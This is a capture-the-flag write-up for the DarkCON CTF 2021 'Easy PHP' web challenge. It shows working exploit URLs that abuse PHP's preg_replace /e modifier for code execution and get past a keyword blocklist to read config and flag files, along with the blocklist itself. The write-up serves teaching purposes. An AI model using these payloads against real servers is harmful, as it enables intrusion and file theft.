# DarkCON CTF 2021 – Easy PHP

* **Category:** web
* **Points:** 384

## Challenge

> Please note....
> 
> Note: This chall does not require any brute forcing
> 
> http://easy-php.darkarmy.xyz/

## Solution

The normal webpage returns a welcome advice.

```
Welcome DarkCON CTF !!
```

But connecting to `http://easy-php.darkarmy.xyz/robots.txt` will reveal the following content.

```
?lmao
```

So you can connect to `http://easy-php.darkarmy.xyz/?lmao` which will return the following PHP code.

```php
<?php
require_once 'config.php';

$text = "Welcome DarkCON CTF !!";

if (isset($_GET['lmao'])) {
    highlight_file(__FILE__);
    exit;
}
else {
    $payload = $_GET['bruh'];
    if (isset($payload)) {
        if (is_payload_danger($payload)) {
            die("Amazing Goob JOb You :) ");
        }
        else {
            echo preg_replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```

Basically you can craft your own `preg_replace`. For example, connecting to `http://easy-php.darkarmy.xyz/?bruh=test&nic3=/DarkCON/` will give you the following.

```
Welcome test CTF !!Welcome DarkCON CTF !!
```

The [`preg_replace` is subject to RCE using `/e`](https://medium.com/@roshancp/command-execution-preg-replace-php-function-exploit-62d6f746bda4).

`http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e` will return the `phpinfo()` output.

But `http://easy-php.darkarmy.xyz/?bruh=system(%27id%27)&nic3=/DarkCON/e` will be blocked by the `is_payload_danger` method.

With some analysis, you can discover that `fread` and `fopen` are available, so you can read `config.php` with a payload like the following, specifying the `config.php` filename in another GET parameter to bypass the check.

```
base64_encode(fread(fopen($_GET['pwn'],'r'),512))

http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php
```

The response is the following.

```
Welcome PD9waHAKZnVuY3Rpb24gaXNfcGF5bG9hZF9kYW5nZXIoJHBheWxvYWQpIHsKCXJldHVybiBwcmVnX21hdGNoKCcvZXhlY3xwYXNzdGhydXxzaGVsbF9leGVjfHN5c3RlbXxwcm9jX29wZW58cG9wZW58Y3VybF9leGVjfGN1cmxfbXVsdGlfZXhlY3xwYXJzZV9pbmlfZmlsZXxyZWFkZmlsZXxyZXF1aXJlfHJlcXVpcmVfb25jZXxpbmNsdWRlfGluY2x1ZGVfb25jZXxwcmludHxmaW5kfGZpbGV8YHxjb25maWd8dmFyX2R1bXB8ZGlyLycsJHBheWxvYWQpOwp9Cj8+Cg== CTF !!Welcome DarkCON CTF !!
```

Decoding the base64, you can discover the source code.

```php
<?php
function is_payload_danger($payload) {
	return preg_match('/exec|passthru|shell_exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|readfile|require|require_once|include|include_once|print|find|file|`|config|var_dump|dir/',$payload);
}
?>
```

Using `glob` function, which is not blocked, you can find an interesting file.

```
http://easy-php.darkarmy.xyz/?bruh=glob(%22*.php%22)[1]&nic3=/DarkCON/e
```

```
Welcome flag210d9f88fd1db71b947fbdce22871b57.php CTF !!Welcome DarkCON CTF !!
```

You can read that file with the technique used before.

```
http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php
```

```
Welcome ZGFya0NPTnt3M2xjMG1lX0Q0cmtDMG5fQ1RGXzJPMjFfZ2d3cCEhISF9Cg== CTF !!Welcome DarkCON CTF !!
```

Decoding the base64 you can discover the flag.

```
darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}
```